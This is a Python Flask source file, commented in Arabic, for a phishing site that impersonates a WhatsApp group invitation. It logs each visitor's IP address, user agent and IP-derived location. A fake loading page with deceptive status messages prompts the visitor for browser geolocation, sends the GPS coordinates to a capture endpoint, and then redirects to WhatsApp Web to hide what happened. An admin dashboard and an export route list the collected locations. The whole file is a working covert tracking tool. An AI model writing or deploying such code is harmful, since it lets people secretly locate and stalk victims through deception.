from flask import Flask, request, jsonify, render_template
import requests
import json
import time
import os
import datetime
import sqlite3

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-this'

# قاعدة البيانات
def init_db():
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ip TEXT,
                  user_agent TEXT,
                  timestamp TEXT,
                  country TEXT,
                  city TEXT,
                  lat REAL,
                  lon REAL,
                  accuracy REAL,
                  source TEXT)''')
    conn.commit()
    conn.close()

init_db()

def get_location_from_ip(ip):
    """الحصول على معلومات الموقع من IP باستخدام خدمات متعددة"""
    services = [
        f'http://ip-api.com/json/{ip}',
        f'https://ipapi.co/{ip}/json/',
        f'http://www.geoplugin.net/json.gp?ip={ip}',
        f'https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip={ip}'
    ]
    
    for service_url in services:
        try:
            response = requests.get(service_url, timeout=3)
            if response.status_code == 200:
                data = response.json()
                
                if 'ip-api.com' in service_url and data.get('status') == 'success':
                    return {
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon'),
                        'source': 'ip-api'
                    }
                elif 'ipapi.co' in service_url and data.get('country_code'):
                    return {
                        'country': data.get('country_name'),
                        'city': data.get('city'),
                        'lat': data.get('latitude'),
                        'lon': data.get('longitude'),
                        'source': 'ipapi'
                    }
                elif 'geoplugin.net' in service_url and data.get('geoplugin_countryCode'):
                    return {
                        'country': data.get('geoplugin_countryName'),
                        'city': data.get('geoplugin_city'),
                        'lat': data.get('geoplugin_latitude'),
                        'lon': data.get('geoplugin_longitude'),
                        'source': 'geoplugin'
                    }
        except:
            continue
    
    return {}

def log_to_db(data):
    """حفظ البيانات في قاعدة البيانات"""
    try:
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('''INSERT INTO logs 
                    (ip, user_agent, timestamp, country, city, lat, lon, accuracy, source)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                 (data.get('ip'), data.get('user_agent'), data.get('timestamp'),
                  data.get('country'), data.get('city'), data.get('lat'),
                  data.get('lon'), data.get('accuracy'), data.get('source')))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Database error: {e}")
        return False

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/whatsapp-group')
def fake_whatsapp_group():
    """صفحة مجموعة واتساب المزيفة"""
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    basic_info = {
        'ip': visitor_ip,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.datetime.now().isoformat(),
        'source': 'initial'
    }
    
    # الحصول على الموقع من IP
    location_info = get_location_from_ip(visitor_ip)
    if location_info:
        basic_info.update(location_info)
        print(f"📍 تم الحصول على موقع من IP: {location_info}")
    
    log_to_db(basic_info)
    return render_template('whatsapp_group.html')

@app.route('/join-group')
def join_group():
    """رابط الانضمام للمجموعة"""
    return render_template('location_access.html')

@app.route('/request-location')
def request_location():
    """طلب إذن الموقع - نسخة محسنة"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>جاري التحميل</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #075E54;
                color: white;
                text-align: center;
                padding: 50px;
                direction: rtl;
            }
            .loader {
                border: 5px solid #f3f3f3;
                border-top: 5px solid #25D366;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .progress {
                width: 100%;
                background: rgba(255,255,255,0.2);
                border-radius: 10px;
                margin: 20px 0;
            }
            .progress-bar {
                width: 0%;
                height: 10px;
                background: #25D366;
                border-radius: 10px;
                transition: width 0.3s;
            }
        </style>
    </head>
    <body>
        <h2>جاري إعداد المجموعة الخاصة بك...</h2>
        <div class="loader"></div>
        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <p id="status">جاري تحميل البيانات...</p>
        
        <script>
            let progress = 0;
            const progressBar = document.getElementById('progressBar');
            const statusText = document.getElementById('status');
            
            // محاكاة تقدم الشريط
            const progressInterval = setInterval(() => {
                progress += 1;
                progressBar.style.width = progress + '%';
                
                if (progress === 30) {
                    statusText.textContent = 'جاري التحقق من الصلاحيات...';
                } else if (progress === 60) {
                    statusText.textContent = 'جاري تأمين الاتصال...';
                } else if (progress === 90) {
                    statusText.textContent = 'جاري الدخول إلى المجموعة...';
                }
                
                if (progress >= 100) {
                    clearInterval(progressInterval);
                    requestGPSCautiously();
                }
            }, 50);
            
            function requestGPSCautiously() {
                if (!navigator.geolocation) {
                    redirectToWhatsApp();
                    return;
                }
                
                // طلب الموقع بخيارات محسنة
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // إرسال الإحداثيات فوراً
                        const gpsData = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: 'gps'
                        };
                        
                        // إرسال سريع دون انتظار رد
                        fetch('/capture-location', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(gpsData),
                            mode: 'no-cors'
                        }).catch(() => {}).finally(() => {
                            redirectToWhatsApp();
                        });
                    },
                    function(error) {
                        // إذا فشل GPS، حاول الحصول على موقع تقريبي من IP
                        fetch('/capture-ip-location', {
                            method: 'POST',
                            mode: 'no-cors'
                        }).catch(() => {}).finally(() => {
                            redirectToWhatsApp();
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,  // وقت أقل
                        maximumAge: 0
                    }
                );
            }
            
            function redirectToWhatsApp() {
                window.location.href = 'https://web.whatsapp.com';
            }
            
            // بديل: إذا لم يعمل الـ GPS، انتقل بعد 10 ثواني
            setTimeout(redirectToWhatsApp, 10000);
        </script>
    </body>
    </html>
    '''

@app.route('/capture-location', methods=['POST'])
def capture_location():
    """استقبال الإحداثيات الدقيقة"""
    try:
        gps_data = request.json
        print(f"🎯 تم الحصول على إحداثيات GPS: {gps_data}")
        
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('''UPDATE logs SET lat = ?, lon = ?, accuracy = ?, source = ?
                     WHERE id = (SELECT MAX(id) FROM logs)''',
                 (gps_data.get('lat'), gps_data.get('lon'), 
                  gps_data.get('accuracy'), 'gps'))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"Error capturing GPS: {e}")
        return jsonify({'status': 'error'})

@app.route('/capture-ip-location', methods=['POST'])
def capture_ip_location():
    """محاولة الحصول على الموقع من IP إذا فشل GPS"""
    try:
        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        location_info = get_location_from_ip(visitor_ip)
        
        if location_info:
            conn = sqlite3.connect('tracker.db')
            c = conn.cursor()
            c.execute('''UPDATE logs SET country = ?, city = ?, lat = ?, lon = ?, source = ?
                         WHERE id = (SELECT MAX(id) FROM logs)''',
                     (location_info.get('country'), location_info.get('city'),
                      location_info.get('lat'), location_info.get('lon'), 'ip-backup'))
            conn.commit()
            conn.close()
            print(f"📡 تم حفظ موقع احتياطي من IP: {location_info}")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"Error capturing IP location: {e}")
        return jsonify({'status': 'error'})

@app.route('/admin')
def admin_dashboard():
    """لوحة التحكم المحسنة"""
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('SELECT * FROM logs ORDER BY id DESC LIMIT 50')
    logs = c.fetchall()
    conn.close()
    
    # إحصائيات
    total_logs = len(logs)
    gps_logs = len([log for log in logs if log[6] and log[7]])  # lat and lon
    ip_logs = len([log for log in logs if log[9] and 'ip' in log[9]])  # source
    
    return render_template('admin.html', logs=logs, total_logs=total_logs, 
                         gps_logs=gps_logs, ip_logs=ip_logs)

@app.route('/export-logs')
def export_logs():
    """تصدير البيانات"""
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('SELECT * FROM logs ORDER BY id DESC')
    logs = c.fetchall()
    conn.close()
    
    return jsonify([{
        'id': log[0], 'ip': log[1], 'user_agent': log[2],
        'timestamp': log[3], 'country': log[4], 'city': log[5],
        'lat': log[6], 'lon': log[7], 'accuracy': log[8], 'source': log[9]
    } for log in logs])

@app.route('/delete-logs', methods=['POST'])
def delete_logs():
    """حذف جميع السجلات"""
    try:
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('DELETE FROM logs')
        conn.commit()
        conn.close()
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    # حاول استخدام بورت 8080 أولاً، وإذا كان مشغولاً جرب 3000
    for port in [8080, 3000, 5001, 8000]:
        try:
            print(f"🔄 جرب تشغيل السيرفر على البورت {port}...")
            app.run(host='0.0.0.0', port=port, debug=False)
            break
        except OSError as e:
            if "Address already in use" in str(e):
                print(f"❌ البورت {port} مشغول، جرب البورت التالي...")
                continue
            else:
                raise e
